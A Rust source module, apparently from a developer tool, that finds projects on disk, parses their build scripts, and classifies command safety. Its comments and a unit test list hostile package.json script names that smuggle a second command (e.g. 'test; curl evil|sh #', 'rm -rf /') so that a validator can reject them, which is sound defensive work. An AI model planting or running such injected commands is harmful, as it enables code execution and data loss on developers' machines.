//! Project Navigator & Command Memory.
//!
//! Scans user-approved root directories for projects (by well-known markers),
//! detects frameworks / package managers, discovers and normalizes their
//! commands (package scripts, Makefiles, justfiles, Taskfiles, framework
//! conventions), and classifies each command's safety. Platform-neutral
//! (ADR-0005): reads the filesystem only, never executes anything, never
//! follows symlinks, and only descends inside the approved roots.
//!
//! Everything here is a best-effort heuristic over static files — an unreadable
//! or malformed file degrades to "no data", never a panic. Confidence scores are
//! honest: an explicit script/target is high (~0.9), a framework convention we
//! merely assume applies is lower (~0.6).

use serde::Deserialize;
use stackpulse_protocol::{CommandSafety, CommandSource, DiscoveredCommand, Project};
use std::collections::HashSet;
use std::fs;
use std::path::{Path, PathBuf};
use std::time::UNIX_EPOCH;

/// Directories we never descend into: dependency/build caches and VCS internals.
/// Kept small and conventional; the marker scan already stops at a project root.
const IGNORE_DIRS: &[&str] = &[
    "node_modules",
    "target",
    ".git",
    "dist",
    "build",
    ".next",
    "vendor",
    ".venv",
];

/// Node dependency name → framework label, checked in this order (so the output
/// is deterministic and the most identifying framework leads).
const NODE_FRAMEWORKS: &[(&str, &str)] = &[
    ("next", "next"),
    ("nuxt", "nuxt"),
    ("react", "react"),
    ("vue", "vue"),
    ("svelte", "svelte"),
    ("@sveltejs/kit", "sveltekit"),
    ("solid-js", "solid"),
    ("@angular/core", "angular"),
    ("astro", "astro"),
    ("remix", "remix"),
    ("@remix-run/react", "remix"),
    ("gatsby", "gatsby"),
    ("vite", "vite"),
    ("webpack", "webpack"),
    ("express", "express"),
    ("koa", "koa"),
    ("fastify", "fastify"),
    ("@nestjs/core", "nest"),
    ("electron", "electron"),
    ("@tauri-apps/api", "tauri"),
    ("tailwindcss", "tailwind"),
    ("typescript", "typescript"),
];

/// Rust crate name → framework label.
const RUST_FRAMEWORKS: &[(&str, &str)] = &[
    ("tokio", "tokio"),
    ("async-std", "async-std"),
    ("actix-web", "actix"),
    ("axum", "axum"),
    ("rocket", "rocket"),
    ("warp", "warp"),
    ("tower", "tower"),
    ("serde", "serde"),
    ("clap", "clap"),
    ("reqwest", "reqwest"),
    ("diesel", "diesel"),
    ("sqlx", "sqlx"),
    ("sea-orm", "sea-orm"),
    ("bevy", "bevy"),
    ("egui", "egui"),
    ("tauri", "tauri"),
    ("leptos", "leptos"),
    ("yew", "yew"),
    ("dioxus", "dioxus"),
];

/// Python distribution name → framework label.
const PY_FRAMEWORKS: &[(&str, &str)] = &[
    ("django", "django"),
    ("flask", "flask"),
    ("fastapi", "fastapi"),
    ("starlette", "starlette"),
    ("uvicorn", "uvicorn"),
    ("pydantic", "pydantic"),
    ("pytest", "pytest"),
    ("numpy", "numpy"),
    ("pandas", "pandas"),
    ("sqlalchemy", "sqlalchemy"),
    ("celery", "celery"),
    ("torch", "pytorch"),
    ("tensorflow", "tensorflow"),
];

/// Discover projects under `roots`, descending at most `max_depth` levels below
/// each root. A directory that matches a marker is a project root and is not
/// descended into further. Read-only; never follows symlinks.
pub fn discover(roots: &[String], max_depth: u32) -> Vec<Project> {
    let mut out = Vec::new();
    let mut seen = HashSet::new();
    for root in roots {
        let path = PathBuf::from(root);
        if !path.is_dir() {
            continue;
        }
        walk(&path, max_depth, &mut out, &mut seen);
    }
    out
}

// ---------------------------------------------------------------------------
// Traversal
// ---------------------------------------------------------------------------

/// One directory entry, resolved once so we don't re-`stat` repeatedly.
struct Entry {
    name: String,
    path: PathBuf,
    is_dir: bool,
    is_symlink: bool,
}

/// Best-effort directory listing. Unreadable directories yield an empty list.
/// `file_type()` is `lstat`-like, so symlinks report `is_symlink() == true`
/// without following them (path-traversal / symlink-loop guard, mirrors
/// [`crate::paths::collect_files`]).
fn list_dir(dir: &Path) -> Vec<Entry> {
    let mut out = Vec::new();
    let rd = match fs::read_dir(dir) {
        Ok(r) => r,
        Err(_) => return out,
    };
    for entry in rd.flatten() {
        let ft = match entry.file_type() {
            Ok(t) => t,
            Err(_) => continue,
        };
        out.push(Entry {
            name: entry.file_name().to_string_lossy().into_owned(),
            path: entry.path(),
            is_dir: ft.is_dir(),
            is_symlink: ft.is_symlink(),
        });
    }
    out
}

fn walk(dir: &Path, depth_remaining: u32, out: &mut Vec<Project>, seen: &mut HashSet<String>) {
    let entries = list_dir(dir);
    let kinds = marker_kinds(&entries);
    if !kinds.is_empty() {
        let path = absolute_string(dir);
        // Dedup projects reachable through more than one approved root.
        if seen.insert(path.clone()) {
            out.push(build_project(dir, path, kinds, &entries));
        }
        // A marker means we've found the project root — do not descend further.
        return;
    }
    if depth_remaining == 0 {
        return;
    }
    for e in &entries {
        if e.is_symlink || !e.is_dir {
            continue;
        }
        if IGNORE_DIRS.contains(&e.name.as_str()) {
            continue;
        }
        walk(&e.path, depth_remaining - 1, out, seen);
    }
}

/// The marker *kinds* present at a directory (e.g. "git", "node", "rust"). Empty
/// ⇒ not a project root.
fn marker_kinds(entries: &[Entry]) -> Vec<String> {
    let names: HashSet<&str> = entries.iter().map(|e| e.name.as_str()).collect();
    let mut kinds: Vec<String> = Vec::new();
    if names.contains(".git") {
        kinds.push("git".into());
    }
    if names.contains("package.json")
        || names.contains("pnpm-workspace.yaml")
        || names.contains("turbo.json")
        || names.contains("nx.json")
    {
        kinds.push("node".into());
    }
    if names.contains("Cargo.toml") {
        kinds.push("rust".into());
    }
    let has_xcode = entries
        .iter()
        .any(|e| e.is_dir && (e.name.ends_with(".xcodeproj") || e.name.ends_with(".xcworkspace")));
    if names.contains("Package.swift") || has_xcode {
        kinds.push("swift".into());
    }
    if names.contains("pyproject.toml") || names.contains("requirements.txt") {
        kinds.push("python".into());
    }
    if names.contains("go.mod") {
        kinds.push("go".into());
    }
    if names.contains("docker-compose.yml") || names.contains("docker-compose.yaml") {
        kinds.push("docker".into());
    }
    if names.contains("pubspec.yaml") {
        kinds.push("flutter".into());
    }
    if names.contains("Gemfile") {
        kinds.push("ruby".into());
    }
    if names.contains("composer.json") || names.contains("wp-config.php") {
        kinds.push("php".into());
    }
    kinds
}

/// Absolute path as a string, without resolving symlinks (we deliberately keep
/// the user-approved path rather than `canonicalize`'s realpath).
fn absolute_string(dir: &Path) -> String {
    let p = if dir.is_absolute() {
        dir.to_path_buf()
    } else {
        std::env::current_dir()
            .map(|c| c.join(dir))
            .unwrap_or_else(|_| dir.to_path_buf())
    };
    p.to_string_lossy().into_owned()
}

// ---------------------------------------------------------------------------
// Per-project assembly
// ---------------------------------------------------------------------------

fn build_project(dir: &Path, path: String, kinds: Vec<String>, entries: &[Entry]) -> Project {
    let names: HashSet<&str> = entries.iter().map(|e| e.name.as_str()).collect();
    let cwd = path.clone();
    let name = dir
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| path.clone());

    // Parse package.json once; reuse for pm default, frameworks, and scripts.
    let pkg = if names.contains("package.json") {
        fs::read_to_string(dir.join("package.json"))
            .ok()
            .and_then(|s| serde_json::from_str::<PackageJson>(&s).ok())
    } else {
        None
    };

    let package_manager = detect_package_manager(&names);

    let mut frameworks: Vec<String> = Vec::new();
    if let Some(ref p) = pkg {
        for f in frameworks_from_package_json(p) {
            push_unique(&mut frameworks, f);
        }
    }
    if names.contains("Cargo.toml") {
        for f in frameworks_from_cargo(dir) {
            push_unique(&mut frameworks, f);
        }
    }
    if names.contains("pyproject.toml") || names.contains("requirements.txt") {
        for f in frameworks_from_python(dir) {
            push_unique(&mut frameworks, f);
        }
    }

    let (git_branch, git_remote) = if names.contains(".git") {
        git_info(dir)
    } else {
        (None, None)
    };

    let last_modified_unix = fs::metadata(dir)
        .ok()
        .and_then(|m| m.modified().ok())
        .and_then(|t| t.duration_since(UNIX_EPOCH).ok())
        .map(|d| d.as_secs() as i64);

    let commands = discover_commands(
        dir,
        &cwd,
        &names,
        &kinds,
        pkg.as_ref(),
        package_manager.as_deref(),
    );

    let mut warnings: Vec<String> = Vec::new();
    if kinds.iter().any(|k| k == "git") && git_remote.is_none() {
        warnings.push("No git remote".into());
    }
    if has_nested_repo(entries) {
        warnings.push("Nested repository".into());
    }
    if !has_readme(entries) {
        warnings.push("No README".into());
    }

    Project {
        name,
        path,
        markers: kinds,
        frameworks,
        package_manager,
        git_branch,
        git_remote,
        last_modified_unix,
        commands,
        warnings,
    }
}

fn push_unique(v: &mut Vec<String>, s: String) {
    if !v.contains(&s) {
        v.push(s);
    }
}

/// A `.git` directory in an immediate child ⇒ a repository nested inside this
/// project. Shallow (one level) and read-only; ignore-listed caches are skipped.
fn has_nested_repo(entries: &[Entry]) -> bool {
    entries.iter().any(|e| {
        e.is_dir
            && !e.is_symlink
            && e.name != ".git"
            && !IGNORE_DIRS.contains(&e.name.as_str())
            && e.path.join(".git").exists()
    })
}

fn has_readme(entries: &[Entry]) -> bool {
    entries
        .iter()
        .any(|e| e.name.to_ascii_uppercase().starts_with("README"))
}

/// Package manager from lockfiles, falling back to the ecosystem default.
fn detect_package_manager(names: &HashSet<&str>) -> Option<String> {
    if names.contains("pnpm-lock.yaml") {
        return Some("pnpm".into());
    }
    if names.contains("yarn.lock") {
        return Some("yarn".into());
    }
    if names.contains("bun.lockb") {
        return Some("bun".into());
    }
    if names.contains("package-lock.json") {
        return Some("npm".into());
    }
    if names.contains("package.json") {
        // Node project with no lockfile ⇒ npm by convention.
        return Some("npm".into());
    }
    if names.contains("Cargo.lock") || names.contains("Cargo.toml") {
        return Some("cargo".into());
    }
    None
}

// ---------------------------------------------------------------------------
// Git
// ---------------------------------------------------------------------------

/// Best-effort branch + origin URL from a `.git` directory. Never fetches; reads
/// only `HEAD` and `config`. A `.git` *file* (worktree/submodule pointer) yields
/// no branch/remote here.
/// The real git directory for `dir`.
///
/// `.git` is usually a directory, but for a **linked worktree or a submodule it is
/// a file** containing `gitdir: <path>`. Treating that as "not a repo" made us
/// report a repository that *has* a remote as having none — and the radar then
/// advised adding a remote the user already has. StackPulse creates linked
/// worktrees itself, so this was self-inflicted.
///
/// Resolved by reading files only — no `git` execution, per this module's contract.
fn resolve_git_dir(dir: &Path) -> Option<PathBuf> {
    let dot_git = dir.join(".git");
    if dot_git.is_dir() {
        return Some(dot_git);
    }
    let content = fs::read_to_string(&dot_git).ok()?;
    let pointer = content.trim().strip_prefix("gitdir:")?.trim();
    let path = PathBuf::from(pointer);
    // The pointer may be relative to the project directory.
    Some(if path.is_absolute() {
        path
    } else {
        dir.join(path)
    })
}

/// The git dir that actually holds `config`.
///
/// A linked worktree's own gitdir has its own HEAD but **no config** — remotes are
/// shared with the main repository, which `commondir` points at. Without this hop
/// a worktree looks remote-less.
fn git_common_dir(gitdir: &Path) -> PathBuf {
    match fs::read_to_string(gitdir.join("commondir")) {
        Ok(rel) => {
            let rel = rel.trim();
            let p = PathBuf::from(rel);
            if p.is_absolute() {
                p
            } else {
                gitdir.join(p)
            }
        }
        Err(_) => gitdir.to_path_buf(),
    }
}

fn git_info(dir: &Path) -> (Option<String>, Option<String>) {
    let Some(gitdir) = resolve_git_dir(dir) else {
        return (None, None);
    };
    let branch = fs::read_to_string(gitdir.join("HEAD")).ok().and_then(|s| {
        s.trim()
            .strip_prefix("ref: refs/heads/")
            .map(str::to_string)
    });
    let remote = fs::read_to_string(git_common_dir(&gitdir).join("config"))
        .ok()
        .and_then(|c| parse_origin_url(&c));
    (branch, remote)
}

/// Extract the `url` of `[remote "origin"]` from a git config (presence only).
fn parse_origin_url(config: &str) -> Option<String> {
    let mut in_origin = false;
    for line in config.lines() {
        let t = line.trim();
        if t.starts_with('[') {
            in_origin = t.starts_with("[remote") && t.contains("\"origin\"");
            continue;
        }
        if in_origin {
            if let Some(rest) = t.strip_prefix("url") {
                if let Some(value) = rest.trim_start().strip_prefix('=') {
                    let value = value.trim();
                    if !value.is_empty() {
                        return Some(value.to_string());
                    }
                }
            }
        }
    }
    None
}

// ---------------------------------------------------------------------------
// Frameworks
// ---------------------------------------------------------------------------

#[derive(Deserialize, Default)]
struct PackageJson {
    #[serde(default)]
    scripts: serde_json::Map<String, serde_json::Value>,
    #[serde(default)]
    dependencies: serde_json::Map<String, serde_json::Value>,
    #[serde(default, rename = "devDependencies")]
    dev_dependencies: serde_json::Map<String, serde_json::Value>,
}

fn frameworks_from_package_json(pkg: &PackageJson) -> Vec<String> {
    let present: HashSet<&str> = pkg
        .dependencies
        .keys()
        .chain(pkg.dev_dependencies.keys())
        .map(String::as_str)
        .collect();
    let mut out: Vec<String> = Vec::new();
    for (dep, label) in NODE_FRAMEWORKS {
        if present.contains(dep) {
            push_unique(&mut out, (*label).to_string());
        }
    }
    out
}

fn frameworks_from_cargo(dir: &Path) -> Vec<String> {
    let content = match fs::read_to_string(dir.join("Cargo.toml")) {
        Ok(c) => c,
        Err(_) => return Vec::new(),
    };
    let deps = cargo_dep_names(&content);
    let mut out: Vec<String> = Vec::new();
    for (dep, label) in RUST_FRAMEWORKS {
        if deps.contains(*dep) {
            push_unique(&mut out, (*label).to_string());
        }
    }
    out
}

/// Collect dependency crate names from a `Cargo.toml` without a TOML parser
/// (keeps the core dependency-free). Recognizes `[dependencies]`-family tables,
/// `[target.'…'.dependencies]`, and `[dependencies.<name>]` sub-tables.
fn cargo_dep_names(content: &str) -> HashSet<String> {
    let mut set = HashSet::new();
    let mut in_deps = false;
    for line in content.lines() {
        let t = line.trim();
        if t.starts_with('[') {
            let inner = t.trim_start_matches('[').trim_end_matches(']');
            if let Some(name) = cargo_subtable_name(inner) {
                set.insert(name);
                in_deps = false;
            } else {
                in_deps = t.ends_with("dependencies]");
            }
            continue;
        }
        if in_deps && !t.is_empty() && !t.starts_with('#') {
            // `name = "1"` or `name = { … }` or `name.workspace = true`.
            let key = t
                .split(|c: char| c == '=' || c == '.' || c.is_whitespace())
                .find(|s| !s.is_empty())
                .unwrap_or("");
            if !key.is_empty() {
                set.insert(key.to_string());
            }
        }
    }
    set
}

/// The crate name of a `[dependencies.<name>]`-style sub-table header, if any.
fn cargo_subtable_name(inner: &str) -> Option<String> {
    for prefix in ["dependencies.", "dev-dependencies.", "build-dependencies."] {
        if let Some(rest) = inner.strip_prefix(prefix) {
            let name = rest.split('.').next().unwrap_or("").trim();
            if !name.is_empty() {
                return Some(name.to_string());
            }
        }
    }
    None
}

fn frameworks_from_python(dir: &Path) -> Vec<String> {
    let mut text = String::new();
    if let Ok(c) = fs::read_to_string(dir.join("pyproject.toml")) {
        text.push_str(&c);
        text.push('\n');
    }
    if let Ok(c) = fs::read_to_string(dir.join("requirements.txt")) {
        text.push_str(&c);
    }
    let lower = text.to_ascii_lowercase();
    let mut out: Vec<String> = Vec::new();
    for (dep, label) in PY_FRAMEWORKS {
        if word_present(&lower, dep) {
            push_unique(&mut out, (*label).to_string());
        }
    }
    out
}

/// Whole-word (identifier-boundary) membership test. `torch` does not match
/// inside `pytorch`. Operates on char boundaries, so it never panics on UTF-8.
fn word_present(text: &str, word: &str) -> bool {
    for (start, m) in text.match_indices(word) {
        let end = start + m.len();
        let before_ok = text[..start]
            .chars()
            .next_back()
            .map(|c| !is_word_char(c))
            .unwrap_or(true);
        let after_ok = text[end..]
            .chars()
            .next()
            .map(|c| !is_word_char(c))
            .unwrap_or(true);
        if before_ok && after_ok {
            return true;
        }
    }
    false
}

fn is_word_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || c == '_'
}

// ---------------------------------------------------------------------------
// Command discovery
// ---------------------------------------------------------------------------

fn discover_commands(
    dir: &Path,
    cwd: &str,
    names: &HashSet<&str>,
    kinds: &[String],
    pkg: Option<&PackageJson>,
    pm: Option<&str>,
) -> Vec<DiscoveredCommand> {
    let mut cmds: Vec<DiscoveredCommand> = Vec::new();

    // --- package.json scripts (explicit; high confidence) ---
    if let Some(p) = pkg {
        let pm = pm.unwrap_or("npm");
        for (name, val) in &p.scripts {
            if !val.as_str().map(|s| !s.trim().is_empty()).unwrap_or(false) {
                continue;
            }
            // The script name is interpolated into a shell command that the app
            // may run, so it is untrusted input from whatever repo is on disk.
            // Without this, a hostile `package.json` with a script literally named
            // `test; curl evil|sh #` yields `npm run test; curl evil|sh #`, which
            // `classify_safety` then reads as *read-only* (it sees the token
            // "test") and `normalize_label` labels "Test" — so it lands on the
            // prominent Test button and runs with **no confirmation**. Skipping
            // unrepresentable names mirrors what the Makefile/justfile/Taskfile
            // parsers already do (`is_target_name` / `is_task_name`).
            if !is_script_name(name) {
                continue;
            }
            let command = node_run(pm, name);
            let safety = classify_safety(&command);
            cmds.push(DiscoveredCommand {
                label: normalize_label(name),
                command,
                cwd: cwd.to_string(),
                source: CommandSource::PackageScript,
                safety,
                confidence: 0.9,
                raw_key: Some(name.clone()),
            });
        }
    }

    // --- Makefile targets ---
    for mk in ["Makefile", "makefile", "GNUmakefile"] {
        if names.contains(mk) {
            if let Ok(content) = fs::read_to_string(dir.join(mk)) {
                for target in parse_makefile(&content) {
                    let command = format!("make {target}");
                    let safety = classify_safety(&command);
                    cmds.push(DiscoveredCommand {
                        label: normalize_label(&target),
                        command,
                        cwd: cwd.to_string(),
                        source: CommandSource::Makefile,
                        safety,
                        confidence: 0.9,
                        raw_key: Some(target),
                    });
                }
            }
            break;
        }
    }

    // --- justfile recipes ---
    for jf in ["justfile", "Justfile", ".justfile"] {
        if names.contains(jf) {
            if let Ok(content) = fs::read_to_string(dir.join(jf)) {
                for recipe in parse_justfile(&content) {
                    let command = format!("just {recipe}");
                    let safety = classify_safety(&command);
                    cmds.push(DiscoveredCommand {
                        label: normalize_label(&recipe),
                        command,
                        cwd: cwd.to_string(),
                        source: CommandSource::Justfile,
                        safety,
                        confidence: 0.9,
                        raw_key: Some(recipe),
                    });
                }
            }
            break;
        }
    }

    // --- Taskfile tasks ---
    for tf in [
        "Taskfile.yml",
        "Taskfile.yaml",
        "taskfile.yml",
        "taskfile.yaml",
    ] {
        if names.contains(tf) {
            if let Ok(content) = fs::read_to_string(dir.join(tf)) {
                for task in parse_taskfile(&content) {
                    let command = format!("task {task}");
                    let safety = classify_safety(&command);
                    cmds.push(DiscoveredCommand {
                        label: normalize_label(&task),
                        command,
                        cwd: cwd.to_string(),
                        source: CommandSource::Taskfile,
                        safety,
                        confidence: 0.9,
                        raw_key: Some(task),
                    });
                }
            }
            break;
        }
    }

    // --- framework conventions (only for labels not already covered) ---
    let mut covered: HashSet<String> = cmds.iter().map(|c| c.label.clone()).collect();
    let add_conv = |cmds: &mut Vec<DiscoveredCommand>,
                    covered: &mut HashSet<String>,
                    label: &str,
                    command: &str| {
        if covered.insert(label.to_string()) {
            cmds.push(DiscoveredCommand {
                label: label.to_string(),
                command: command.to_string(),
                cwd: cwd.to_string(),
                source: CommandSource::FrameworkConvention,
                safety: classify_safety(command),
                confidence: 0.6,
                raw_key: None,
            });
        }
    };
    if kinds.iter().any(|k| k == "rust") {
        add_conv(&mut cmds, &mut covered, "Build", "cargo build");
        add_conv(&mut cmds, &mut covered, "Test", "cargo test");
        add_conv(&mut cmds, &mut covered, "Run", "cargo run");
    }
    if names.contains("Package.swift") {
        add_conv(&mut cmds, &mut covered, "Build", "swift build");
        add_conv(&mut cmds, &mut covered, "Test", "swift test");
    }
    if names.contains("pyproject.toml") {
        add_conv(&mut cmds, &mut covered, "Test", "pytest");
        add_conv(&mut cmds, &mut covered, "Lint", "ruff check .");
    }

    // Dedup identical command strings (keeps the first, i.e. explicit) …
    let mut seen = HashSet::new();
    cmds.retain(|c| seen.insert(c.command.clone()));
    // … then surface the most useful first. Stable sort preserves discovery
    // order within a rank.
    cmds.sort_by_key(|c| order_rank(&c.label));
    cmds
}

/// The idiomatic invocation of a package script for a given package manager.
fn node_run(pm: &str, name: &str) -> String {
    match pm {
        "pnpm" => format!("pnpm {name}"),
        "yarn" => format!("yarn {name}"),
        "bun" => format!("bun run {name}"),
        _ => format!("npm run {name}"),
    }
}

/// Ordering weight: Test, Dev, Build, Lint, Type-check, then everything else.
fn order_rank(label: &str) -> u8 {
    match label {
        "Test" => 0,
        "Dev" => 1,
        "Build" => 2,
        "Lint" => 3,
        "Type-check" => 4,
        _ => 5,
    }
}

/// A human, normalized action label derived from a script/target name.
fn normalize_label(name: &str) -> String {
    let n = name.to_ascii_lowercase();
    if n.contains("e2e") {
        "E2E".to_string()
    } else if n.contains("typecheck") || n.contains("type-check") || n.contains("tsc") {
        "Type-check".to_string()
    } else if n.contains("test") {
        "Test".to_string()
    } else if n.contains("build") {
        "Build".to_string()
    } else if n.contains("dev") || n.contains("start") {
        "Dev".to_string()
    } else if n.contains("lint") {
        "Lint".to_string()
    } else if n.contains("format") || n.contains("fmt") {
        "Format".to_string()
    } else if n.contains("preview") {
        "Preview".to_string()
    } else if n.contains("migrate") {
        "Migrate".to_string()
    } else if n.contains("deploy") {
        "Deploy".to_string()
    } else {
        title_case(name)
    }
}

/// Title-case an identifier, splitting on non-alphanumeric separators.
fn title_case(s: &str) -> String {
    let words: Vec<String> = s
        .split(|c: char| !c.is_ascii_alphanumeric())
        .filter(|w| !w.is_empty())
        .map(|w| {
            let mut chars = w.chars();
            match chars.next() {
                Some(first) => first.to_ascii_uppercase().to_string() + chars.as_str(),
                None => String::new(),
            }
        })
        .collect();
    if words.is_empty() {
        s.to_string()
    } else {
        words.join(" ")
    }
}

/// Classify a command by keyword. Checked most-dangerous-first so, when several
/// categories match, we surface the more cautious one — and never label a
/// writing command `ReadOnly`.
fn classify_safety(text: &str) -> CommandSafety {
    let t = text.to_ascii_lowercase();
    let tokens: HashSet<&str> = t
        .split(|c: char| !c.is_ascii_alphanumeric())
        .filter(|s| !s.is_empty())
        .collect();
    let has = |w: &str| tokens.contains(w);
    let contains = |s: &str| t.contains(s);

    // Destructive — clean/reset/rm/prune/force. (`rm`/`force` are token-matched
    // so they don't fire on substrings like "fo*rm*at".)
    if has("clean")
        || has("reset")
        || has("prune")
        || has("rm")
        || has("force")
        || contains("--force")
    {
        CommandSafety::Destructive
    }
    // Database — migrations, seeds, prisma, `db:` prefixes.
    else if has("migrate") || has("seed") || has("prisma") || contains("db:") {
        CommandSafety::ChangesDatabase
    }
    // Network — deploy/publish/push/release.
    else if has("deploy") || has("publish") || has("push") || has("release") {
        CommandSafety::Network
    }
    // Installs dependencies — the unambiguous keyword.
    else if contains("install") {
        CommandSafety::InstallsDeps
    }
    // Modifies files — formatters and code generation.
    else if has("format") || has("fmt") || has("codegen") || has("generate") {
        CommandSafety::ModifiesFiles
    }
    // Read-only — tests, linters, type checks, version probes.
    else if contains("test")
        || contains("lint")
        || contains("typecheck")
        || contains("type-check")
        || has("tsc")
        || contains("check")
        || contains("--version")
        || has("version")
    {
        CommandSafety::ReadOnly
    }
    // Local dev / build — runs the app or writes build artifacts.
    else if has("dev")
        || has("start")
        || has("serve")
        || has("preview")
        || has("watch")
        || has("run")
        || contains("build")
    {
        CommandSafety::LocalDev
    }
    // Installs dependencies — short/ambiguous forms (`npm ci`, `npm i`, `add`),
    // checked last so they don't shadow a clearer classification.
    else if has("ci") || has("add") || has("i") {
        CommandSafety::InstallsDeps
    }
    // Unknown: assume it may run/write — never silently ReadOnly.
    else {
        CommandSafety::LocalDev
    }
}

// ---------------------------------------------------------------------------
// Build-file parsers (no external deps)
// ---------------------------------------------------------------------------

/// Parse `^<name>:` targets from a Makefile. Skips recipe bodies (tab-indented),
/// `.PHONY` and other dot targets, pattern rules, and `VAR := …` assignments.
fn parse_makefile(content: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut seen = HashSet::new();
    for line in content.lines() {
        if line.starts_with('\t') {
            continue; // recipe body
        }
        let trimmed = line.trim_start();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        let Some(colon) = line.find(':') else {
            continue;
        };
        // `VAR := value` / `VAR ::= value` — the char after ':' is '='.
        if line.as_bytes().get(colon + 1) == Some(&b'=') {
            continue;
        }
        let name = line[..colon].trim();
        if name.is_empty() || !is_target_name(name) {
            continue;
        }
        if seen.insert(name.to_string()) {
            out.push(name.to_string());
        }
    }
    out
}

/// Parse recipe names from a justfile. Skips indented bodies, comments,
/// `name := …` assignments, and known settings/keywords.
fn parse_justfile(content: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut seen = HashSet::new();
    for line in content.lines() {
        if line.starts_with(char::is_whitespace) {
            continue; // recipe body
        }
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') || trimmed.contains(":=") {
            continue;
        }
        let Some(colon) = trimmed.find(':') else {
            continue;
        };
        let name = trimmed[..colon].split_whitespace().next().unwrap_or("");
        if name.is_empty() || !is_target_name(name) {
            continue;
        }
        if matches!(name, "set" | "export" | "alias" | "import" | "mod") {
            continue;
        }
        if seen.insert(name.to_string()) {
            out.push(name.to_string());
        }
    }
    out
}

/// Parse task names from a Taskfile's top-level `tasks:` map (indentation-based;
/// no YAML dependency).
fn parse_taskfile(content: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut seen = HashSet::new();
    let mut in_tasks = false;
    let mut base_indent: Option<usize> = None;
    for line in content.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        let indent = line.len() - line.trim_start().len();
        if !in_tasks {
            if indent == 0 && trimmed == "tasks:" {
                in_tasks = true;
                base_indent = None;
            }
            continue;
        }
        if indent == 0 {
            // Back to a top-level key: the tasks block ended.
            in_tasks = trimmed == "tasks:";
            base_indent = None;
            continue;
        }
        let bi = *base_indent.get_or_insert(indent);
        if indent != bi {
            continue; // nested task fields (cmds:, desc:, …)
        }
        let Some(colon) = trimmed.find(':') else {
            continue;
        };
        let name = trimmed[..colon].trim().trim_matches('"').trim_matches('\'');
        if name.is_empty() || !is_task_name(name) {
            continue;
        }
        if seen.insert(name.to_string()) {
            out.push(name.to_string());
        }
    }
    out
}

/// A Make/just target name: identifier characters only (excludes `.PHONY`,
/// pattern rules `%`, paths `/`, and multi-word prerequisite lists).
/// A script name that would inject a second shell command must never become a
/// runnable command — the injected text otherwise defeats the app's own safety
/// gate, because `classify_safety` reads the *invocation string* and a payload
/// like `test; curl evil|sh #` classifies as harmless `read_only`.
#[cfg(test)]
mod script_name_tests {
    use super::is_script_name;

    #[test]
    fn rejects_shell_metacharacters() {
        for hostile in [
            "test; echo pwned #",
            "test && curl evil|sh",
            "test`whoami`",
            "test$(whoami)",
            "test\nrm -rf /",
            "test > /etc/passwd",
            "test'; rm -rf ~;'",
            "test | tee x",
            "test & disown",
            "-rf", // would be read as a flag
            "",
        ] {
            assert!(
                !is_script_name(hostile),
                "must reject hostile script name: {hostile:?}"
            );
        }
    }

    #[test]
    fn accepts_real_world_script_names() {
        for ok in [
            "test",
            "test:e2e",
            "build.dev",
            "lint-fix",
            "type-check",
            "db:migrate:up",
            "@scope/thing",
            "test_unit",
            "build2",
        ] {
            assert!(is_script_name(ok), "must accept real script name: {ok:?}");
        }
    }
}

fn is_target_name(name: &str) -> bool {
    name.chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
}

/// A Taskfile task key — like [`is_target_name`] but also allows `:` namespaces.
fn is_task_name(name: &str) -> bool {
    name.chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-' || c == ':')
}

/// An npm/pnpm/yarn/bun script key that is safe to interpolate into a shell
/// command (`npm run <name>`).
///
/// **Security boundary, not cosmetics.** `package.json` comes from whatever repo
/// is on disk, and the resulting string is handed to a shell — so anything that
/// could terminate the `run` argument and start a new command (`;`, `&`, `|`,
/// backticks, `$(`, newlines, quotes, redirects) must never get through. A name
/// that fails this is skipped rather than sanitized: we'd have to guess what the
/// author meant, and a script we can't represent faithfully is better omitted
/// than run wrong.
///
/// The allowed set covers real-world names (`test:e2e`, `build.dev`, `lint-fix`,
/// `@scope/x`) — deliberately a whitelist, since the blocklist of shell
/// metacharacters is the thing you get wrong.
fn is_script_name(name: &str) -> bool {
    !name.is_empty()
        // A leading '-' would be read by npm as a flag rather than a script.
        && !name.starts_with('-')
        && name.chars().all(|c| {
            c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | ':' | '.' | '/' | '@')
        })
}

// ---------------------------------------------------------------------------
// Unit tests (pure helpers; the filesystem paths are covered in tests/projects.rs)
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn classify_covers_each_category() {
        assert_eq!(classify_safety("pnpm test"), CommandSafety::ReadOnly);
        assert_eq!(classify_safety("npm run lint"), CommandSafety::ReadOnly);
        assert_eq!(classify_safety("cargo build"), CommandSafety::LocalDev);
        assert_eq!(classify_safety("pnpm dev"), CommandSafety::LocalDev);
        assert_eq!(classify_safety("cargo fmt"), CommandSafety::ModifiesFiles);
        assert_eq!(
            classify_safety("npm run codegen"),
            CommandSafety::ModifiesFiles
        );
        assert_eq!(classify_safety("npm install"), CommandSafety::InstallsDeps);
        assert_eq!(classify_safety("npm ci"), CommandSafety::InstallsDeps);
        assert_eq!(
            classify_safety("prisma migrate deploy"),
            CommandSafety::ChangesDatabase
        );
        assert_eq!(classify_safety("pnpm deploy"), CommandSafety::Network);
        assert_eq!(classify_safety("make clean"), CommandSafety::Destructive);
        assert_eq!(classify_safety("rm -rf dist"), CommandSafety::Destructive);
    }

    #[test]
    fn format_is_not_destructive_via_rm_substring() {
        // "fo*rm*at" contains "rm" as a substring; must not be Destructive.
        assert_eq!(classify_safety("pnpm format"), CommandSafety::ModifiesFiles);
    }

    #[test]
    fn labels_normalize_from_keywords() {
        assert_eq!(normalize_label("test"), "Test");
        assert_eq!(normalize_label("test:e2e"), "E2E");
        assert_eq!(normalize_label("typecheck"), "Type-check");
        assert_eq!(normalize_label("tsc"), "Type-check");
        assert_eq!(normalize_label("build:prod"), "Build");
        assert_eq!(normalize_label("start"), "Dev");
        assert_eq!(normalize_label("lint"), "Lint");
